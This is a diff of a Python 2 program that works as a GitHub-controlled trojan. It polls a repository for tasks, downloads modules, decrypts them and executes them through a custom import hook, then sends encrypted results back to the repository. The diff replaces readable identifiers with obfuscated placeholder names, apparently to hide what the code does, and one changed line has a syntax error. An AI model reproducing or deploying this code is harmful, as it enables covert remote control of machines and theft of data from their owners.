@@ -13,119 +13,119 @@ from Crypto.PublicKey import RSA as $011
 from Crypto.Cipher import PKCS1_OAEP as $012
 from github3 import login as $013
 
-class Config:
+class $103:
 	def __init__($014):
-		$014.mod = "modules/"
-		$014.config = "config/"
-		$014.data = "data/"
-		$014.repo = "wendigo_test"
-		$014.usr = "daniellohrey"
-		$014.token = "INSERT TOKEN"
-		$014.pk = "INSERT PUBLIC KEY"
-		$014.pwd = "password"
-		$014.sleep = "10"
-		$014.fn_s = "fn_mod"
-		$014.id_s = "id_slp"
-		$014.imp = "import %s"
-		$014.size = "256"
-		$014.size = int($014.fixstr($014.size))
-		$014.sleep = int($014.fixstr($014.sleep))
-		$014.tasks = $006.Queue()
-		$014.u_id()
-		$014.u_pk($014.pk)
+		$014.$130 = "modules/"
+		$014.$131 = "config/"
+		$014.$132 = "data/"
+		$014.$133 = "wendigo_test"
+		$014.$134 = "daniellohrey"
+		$014.$135 = "INSERT TOKEN"
+		$014.$136 = "INSERT PUBLIC KEY"
+		$014.$137 = "password"
+		$014.$138 = "10"
+		$014.$139 = "fn_mod"
+		$014.$140 = "id_slp"
+		$014.$141 = "import %s"
+		$014.$142 = "256"
+		$014.$142 = int($014.$128($014.$142))
+		$014.$138 = int($014.$128($014.$138))
+		$014.$143 = $006.Queue()
+		$014.$104()
+		$014.$118($014.$136)
 
-	def u_id($015):
+	def $104($015):
 		$016 = int($003.time())
-		$017 = str($016) + $015.fixstr($015.id_s)
-		$015.id = str($010.xxh64($017).hexdigest())
-		$015.id = $015.obfstr($015.id)
+		$017 = str($016) + $015.$125()
+		$015.$155 = str($010.xxh64($017).hexdigest())
+		$015.$155 = $015.$129($015.$155)
 
-	def g_id($018):
-		return $018.fixstr($018.id)
+	def $105($018):
+		return $018.$128($018.$155)
 
-	def g_mod($019):
-		return $019.fixstr($019.mod)
+	def $106($019):
+		return $019.$128($019.$130)
 
-	def u_mod($020, $021):
-		$020.mod = $020.obfstr($021)
+	def $107($020, $021):
+		$020.$130 = $020.$129($021)
 		return
 
-	def g_config($022):
-		return $022.fixstr($022.config) + $022.g_id()
+	def $108($022):
+		return $022.$128($022.$131) + $022.$105()
 
-	def u_config($023, $024):
-		$023.config = $023.obfstr($024)
+	def $109($023, $024):
+		$023.$131 = $023.$129($024)
 		return
 
-	def g_data($025):
-		return $025.fixstr($025.data) + $025.id() + "/" + $025.g_fn()
+	def $110($025):
+		return $025.$128($025.$132) + $025.$105() + "/" + $025.$121()
 
-	def u_data($026, $027):
-		$026.data = $026.obfstr($027)
+	def $111($026, $027):
+		$026.$132 = $026.$129($027)
 		return
 
-	def g_usr($028):
-		return $028.fixstr($028.usr)
+	def $112($028):
+		return $028.$128($028.$134)
 
-	def u_usr($029, $030):
-		$029.usr = $029.obfstr($030)
+	def $113($029, $030):
+		$029.$134 = $029.$129($030)
 		return
 
-	def g_token($031):
-		return $001.b64decode($031.fixstr($031.token))
+	def $114($031):
+		return $001.b64decode($031.$128($031.$135))
 
-	def u_token($032, $033):
-		$032.token = $032.obfstr($001.b64encode($033))
+	def $115($032, $033):
+		$032.$135 = $032.$129($001.b64encode($033))
 		return
 
-	def g_repo($034):
-		return $034.fixstr($034.repo)
+	def $116($034):
+		return $034.$128($034.$133)
 
-	def u_repo($035, $036):
-		$035.repo = $035.obfstr($036)
+	def $117($035, $036):
+		$035.$133 = $035.$129($036)
 		return
 
-	def u_pk($037, $038):
-		$038 = $001.b64decode($037.fixstr($038))
-		$037.pk = $038
-		$037.pk = $011.importKey($037.pk)
-		$037.pk = $012.new($037.pk)
+	def $118($037, $038):
+		$038 = $001.b64decode($037.$128($038))
+		$037.$136 = $038
+		$037.$136 = $011.importKey($037.$136)
+		$037.$136 = $012.new($037.$136)
 		return
 
-	def g_pwd($039):
-		return $039.fixstr($039.pwd)
+	def $119($039):
+		return $039.$128($039.$137)
 
-	def u_pwd($040, $041):
-		$040.pwd = $040.obfstr($041)
+	def $120($040, $041):
+		$040.$137 = $040.$129($041)
 		return
 
-	def g_fn($042):
+	def $121($042):
 		$043 = int($003.time())
-		$044 = str($043) + $042.fixstr($042.fn_s)
+		$044 = str($043) + $042.$124()
 		return $010.xxh64($044).hexdigest()
 
-	def g_com($045):
+	def $122($045):
 		$046 = str($003.time())
 		return $010.xxh64($046).hexdigest()
 
-	def g_imp($047):
-		return $047.fixstr($047.imp)
+	def $123($047):
+		return $047.$128($047.$141)
 
-	def g_fn_s($048):
-		return $048.fixstr($048.fn_s)
+	def $124($048):
+		return $048.$128($048.$139)
 
-	def g_id_s($049):
-		return $049.fixstr($049.id_s)
+	def $125($049):
+		return $049.$128($049.$140)
 
-	def u_id_s($050, $051):
-		$050.id_s = $050.obfstr($051)
+	def $126($050, $051):
+		$050.$140 = $050.$129($051)
 		return
 
-	def u_fn_id($052, $053):
-		$052.fn_s = $052.obfstr($053)
+	def $127($052, $053):
+		$052.$139 = $052.$129($053)
 		return
 
-	def fixstr($054, $055):
+	def $128($054, $055):
 		$056 = 0
 		$057 = ""
 		for $058 in $055:
@@ -134,9 +134,9 @@ class Config:
 			$056 += 1
 		return $057
 
-	def obfstr($059, $060):
+	def $129($059, $060):
 		$062 = int($003.time())
-		$063 = str($062) + $059.fixstr($059.id_s)
+		$063 = str($062) + $059.$125()
 		$064 = str($010.xxh64($063).hexdigest())
 		$065 = 0
 		$061 = ""
@@ -147,133 +147,133 @@ class Config:
 		$061 += $064[$065 % len($064)]
 		return $061
 
-class ReImp(object):
-	def __init__(self):
-		self.code = ""
+class $102(object):
+	def __init__($067):
+		$067.code = ""
 
-	def find_module(self, fullname, path=None):
-		lib = get_file(config.g_mod() + fullname)
-		if lib is not None:
-			self.code = lib
-			return self
+	def find_module($068, fullname, path = None):
+		$069 = $146($144.$106() + fullname)
+		if $069 is not None:
+			$068.code = $069
+			return $068
 		return None
 
-	def load_module(self,name):
-		module = $004.new_module(name)
-		exec self.code in module.__dict__
-		$002.modules[name] = module
-		return module
+	def load_module($070, name):
+		$071 = $004.new_module(name)
+		exec $070.code in $071.__dict__
+		$002.modules[name] = $071
+		return $071
 
-def connect():
-	gh = $013(token = config.g_token())
-	repo = gh.repository(config.g_usr(), config.g_repo())
-	return repo
+def $145():
+	$072 = $013(token = $144.$114())
+	$073 = $072.repository($144.$112(), $144.$116())
+	return $073
 
-def get_file(path):
+def $146($074):
 	try:
-		repo = connect()
-		return decrypt(repo.file_contents(path).decoded)
+		$075 = $145()
+		return $151($075.file_contents($074).decoded)
 	except:
 		return None
 
-def create_config():
-	repo = connect()
-	repo.create_file(config.g_config(), config.g_com(), config.g_com())
+def $147():
+	$076 = $145()
+	$076.create_file($144.$108(), $144.$122(), $144.$122())
 	return
 
-def get_config():
-	c_json = get_file(config.g_config())
+def $148():
+	$077 = $146($144.$108())
 	try:
-		c_dict = $000.loads(c_json)
-		for mod in c_dict:
-			if mod[config.fn_s] not in $002.modules:
-				exec(config.g_imp() % mod[config.fn_s])
-		return c_dict
+		$078 = $000.loads($077)
+		for $079 in $078:
+			if $079[$144.$124()] not in $002.modules:
+				exec($144.$123() % $079[$144.$124()])
+		return $078
 	except:
 		return None
 
-def clear_config():
-	repo = connect()
-	repo.file_contents(config.g_config()).update(config.g_com(), config.g_com())
+def $149():
+	$080 = $145()
+	$080.file_contents($144.$108()).update($144.$122(), $144.$122())
 
-def push_data(data):
-	repo = connect()
-	repo.create_file(config.g_data(), config.g_com(), encrypt(data))
+def $150($082):
+	$081 = $145()
+	$081.create_file($144.$110), $144.$122(), $152($082))
 	return
 
-def decrypt(data):
-	decoded = $001.b64decode(data)
-	s_io = $009.StringIO(decoded)
-	zipped = $008.ZipFile(s_io, 'r')
-	uzip = zipped.read(config.fn_s, config.g_pwd())
-	zipped.close()
-	s_io.close()
-	return uzip
+def $151($083):
+	$084 = $001.b64decode($083)
+	$085 = $009.StringIO($084)
+	$086 = $008.ZipFile($085, 'r')
+	$087 = $086.read($144.$124(), $144.$119())
+	$086.close()
+	$085.close()
+	return $087
 
-def encrypt(data):
-	key = config.g_pk()
-	size = config.size
-	offset = 0
-	encrypted = ""
-	compressed = $007.compress(data)
-	while offset < len(compressed):
-		chunk = compressed[offset:offset+size]
-		if len(chunk) % size != 0:
-			chunk += " " * (size - len(chunk))
-		encrypted += key.encrypt(chunk)
-		offset += size
-	return $001.b64encode(encrypted)
+def $152($088):
+	$089 = $144.$136
+	$090 = $144.$142
+	$091 = 0
+	$092 = ""
+	$093 = $007.compress($088)
+	while $091 < len($093):
+		$094 = $093[$091:$091+$090]
+		if len($094) % $090 != 0:
+			$094 += " " * ($090 - len($094))
+		$092 += $089.encrypt($094)
+		$091 += $090
+	return $001.b64encode($092)
 
-def run_module(**task):
+def $153(**$095):
 	try:
-		global config
-		conf, result = $002.modules[task[config.fn_s]].run(config, **task)
-		if conf is not None:
-			config = conf
+		global $144
+		$097, $096 = $002.modules[$095[$144.$124()]].run($144, **$095)
+		if $097 is not None:
+			$144 = $097
 		while True:
 			try:
-				if result is not None:
-					push_data(result)
+				if $096 is not None:
+					$150($096)
 				else:
-					push_data(config.g_com())
+					$150($144.$122())
 				return
 			except:
-				$003.sleep(config.sleep)
+				$003.sleep($144.$138)
 	except:
 		return
 
-def module_runner():
-	while not config.tasks.empty():
-		task = config.tasks.get()
-		t = $005.Thread(target=run_module, kwargs = task)
-		t.start()
+def $154():
+	while not $144.$143.empty():
+		$098 = $144.$143.get()
+		$099 = $005.Thread(target = $153, kwargs = $098)
+		$099.start()
 		try:
-			$003.sleep(int(task[config.id_s]))
+			$003.sleep(int($098[$144.$125()]))
 		except:
 			pass
 	return
 
-config = Config()
-$002.meta_path = [ReImp()]
+$144 = $103()
+$002.meta_path = [$102()]
 while True:
 	try:
-		create_config()
+		$147()
 		break
 	except:
-		$003.sleep(config.sleep)
+		$003.sleep($144.$138)
 while True:
-	if config.tasks.empty():
-		config_file = get_config()
-		if config_file == None:
-			$003.sleep(config.sleep)
+	if $144.$143.empty():
+		$100 = $148()
+		if $100 == None:
+			$003.sleep($144.$138)
 			continue
-		for task in config_file:
-			config.tasks.put(task)
-	if not config.tasks.empty():
-		module_runner()
+		for $101 in $100:
+			$144.$143.put($101)
+	if not $144.$143.empty():
+		$154()
 		while True:
 			try:
-				clear_config()
+				$149()
 				break
 			except:
-				$003.sleep(config.sleep)
+				$003.sleep($144.$138)
